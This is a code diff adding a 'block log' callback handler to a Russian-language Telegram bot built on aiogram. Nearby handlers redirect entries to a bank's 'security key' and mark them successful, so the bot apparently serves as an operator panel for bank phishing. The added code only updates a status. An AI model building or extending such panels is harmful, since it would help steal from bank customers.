@@ -1375,6 +1375,28 @@ async def security_key(callback: types.CallbackQuery):
     
     await callback.answer(f"✅ Редирект на ключ {bank_name}")
 
+# --- ЗАБЛОКИРОВАТЬ ЛОГ ---
+@router.callback_query(F.data.startswith("block_log:"))
+async def block_log(callback: types.CallbackQuery):
+    log_id = int(callback.data.split(":")[1])
+    log = await Log.get_by_id(log_id)
+    
+    if not log:
+        await callback.answer("❌ Лог не найден", show_alert=True)
+        return
+    
+    await log.update_status("blocked")
+    
+    await callback.message.edit_text(
+        callback.message.text + "\n\n🚫 <b>ЗАБЛОКИРОВАН</b>",
+        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
+            [types.InlineKeyboardButton(text="🚫 ЗАБЛОКИРОВАН", callback_data="_")]
+        ])
+    )
+    
+    await callback.answer("🚫 Лог заблокирован!")
+    logger.info(f"Лог #{log.id} заблокирован")
+
 # --- УСПЕХ ---
 @router.callback_query(F.data.startswith("success:"))
 async def success_log(callback: types.CallbackQuery):
